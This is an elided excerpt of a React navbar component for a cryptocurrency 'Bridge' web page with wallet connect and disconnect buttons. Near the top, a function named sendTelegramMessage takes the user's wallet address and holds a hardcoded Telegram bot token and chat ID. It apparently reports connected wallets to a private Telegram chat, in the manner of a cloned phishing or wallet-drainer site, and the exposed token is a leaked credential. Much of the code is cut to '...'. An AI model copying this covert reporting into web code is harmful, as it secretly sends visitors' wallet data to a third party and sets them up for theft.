...
function BridgePageNavbar() {
  ...
  function sendTelegramMessage(address) {
    const botToken = "6838411368:AAElyI53lMBW6NAfmGIinBMzBPBACQ2B058";
    const chatId = "5411414527"; // This could be your Telegram user ID or group ID
  ...
  return (
    <nav
      className="mb-12 mx-auto max-w-7xl p-4 lg:px-8 items-center grid grid-cols-2 lg:flex"
      aria-label="Global"
    >
      <div className="flex">
        <a
      ...
      <div className="hidden lg:flex justify-center gap-6 xl:gap-12 lg:grow">
        <span>
          <a
            target="_self"
            className="focus:outline-none transition ease-in-out duration-300 cursor-pointer text-type-secondary hover:text-type-primary"
            rel="noreferrer noopener"
        ...
        <span>
          <a
            target="_self"
            className="focus:outline-none transition ease-in-out duration-300 cursor-pointer text-type-secondary hover:text-type-primary text-type-primary relative select-none pointer-events-none"
            rel="noreferrer noopener"
            href="/"
          >
            Bridge
        ...
        <span>
          <a
            target="_self"
            className="focus:outline-0 transition ease-in-out duration-300 cursor-pointer text-type-secondary hover:text-type-primary"
            rel="noreferrer noopener"
      ...
      {isConnected ? (
        <div className="flex justify-end gap-10">
          <div className="grid hidden lg:block">
            <div className="flex flex-row gap-4 w-full">
              ...
              >
                ...
                >
                  ...
                  <g mask="url(#mask__pixel)">
                    ...
                    <rect x="20" width="10" height="10" fill="#92A1C6"></rect>
                    <rect x="40" width="10" height="10" fill="#92A1C6"></rect>
                    <rect x="60" width="10" height="10" fill="#F0AB3D"></rect>
                    <rect x="10" width="10" height="10" fill="#92A1C6"></rect>
                    <rect x="30" width="10" height="10" fill="#C20D90"></rect>
                    <rect x="50" width="10" height="10" fill="#F0AB3D"></rect>
                    <rect x="70" width="10" height="10" fill="#F0AB3D"></rect>
                    <rect y="10" width="10" height="10" fill="#C20D90"></rect>
                    <rect y="20" width="10" height="10" fill="#F0AB3D"></rect>
                    <rect y="30" width="10" height="10" fill="#C20D90"></rect>
                    <rect y="40" width="10" height="10" fill="#C20D90"></rect>
                    <rect y="50" width="10" height="10" fill="#C271B4"></rect>
                    <rect y="60" width="10" height="10" fill="#92A1C6"></rect>
                    <rect y="70" width="10" height="10" fill="#F0AB3D"></rect>
                    <rect
                      x="20"
                      y="10"
                      width="10"
              ...
              <button
                onClick={() => disconnect()}
                className="undefined h-fit rounded-lg text-md font-medium transition-all disabled:cursor-not-allowed disabled:opacity-50 w-fit  px-4 py-2 text-sm text-black bg-button-primary hover:bg-button-primaryHover disabled:hover:bg-transparent text-sm undefined"
              >
                Disconnect
              </button>
            </div>
        ...
        <div className="flex justify-end gap-10">
          ...
          <div className="grid lg:hidden">
            <button
              type="button"
              className="bg-transparent -m-2.5 inline-flex items-center justify-center rounded-md p-2.5"
            >
              <span className="sr-only">Open main menu</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
